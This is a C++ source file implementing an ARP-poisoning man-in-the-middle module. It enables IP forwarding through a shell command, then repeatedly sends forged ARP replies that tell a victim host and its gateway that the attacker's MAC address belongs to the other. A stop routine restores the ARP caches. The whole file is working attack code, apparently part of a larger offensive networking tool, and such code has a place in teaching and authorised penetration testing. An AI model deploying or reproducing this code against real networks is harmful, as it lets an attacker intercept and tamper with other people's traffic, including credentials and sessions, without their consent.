#include "Mitm.hh"

Mitm::Mitm(Core &core, const std::string &victimIp, const std::string &gatewayIp)
    : AModule(core, "Mitm"), _run(false)
{
    _gateway.ip(IPv4Address(gatewayIp));
    _gateway.mac(_core.arpRequest(_gateway.ip()));

    _victim.ip(IPv4Address(victimIp));
    _victim.mac(_core.arpRequest(_victim.ip()));

    // Enable ip forwarding
    system("echo 1 > /proc/sys/net/ipv4/ip_forward");

    std::cout << "Start MITM : [" << _gateway.ip() << "] <---> [" << _victim.ip() << "]" << std::endl;
}

void Mitm::start(void)
{
    // Start poisoning arp tables
    std::cout << "Starting arp poisoning" << std::endl;
    _run = true;
    while (_run)
    {
        // Tell gateway thats _victim.ip() is _attackerMac
        _core.arpReply(_victim.ip(), _core.mac(), _gateway.ip(), _gateway.mac());
        // Tell victim thats _gateway.ip() is _attackerMac
        _core.arpReply(_gateway.ip(), _core.mac(), _victim.ip(), _victim.mac());
        // Don't need to spam
        sleep(5);
    }
}

void Mitm::stop(void)
{
    std::cout << "Stopping MITM.." << std::endl;
    _run = false;

    // Disable ip forward
    system("echo 0 > /proc/sys/net/ipv4/ip_forward");

    // Restore arp cache
    std::cout << "Restore arp cache" << std::endl;
    for (int i = 0; i < 2; i++)
    {
        // Tell gateway thats _victim.ip() is _victim.mac()
        _core.arpReply(_victim.ip(), _victim.mac(), _gateway.ip(), _gateway.mac());
        // Tell victim thats _gateway.ip() is _gateway.mac()
        _core.arpReply(_gateway.ip(), _gateway.mac(), _victim.ip(), _victim.mac());
    }
}
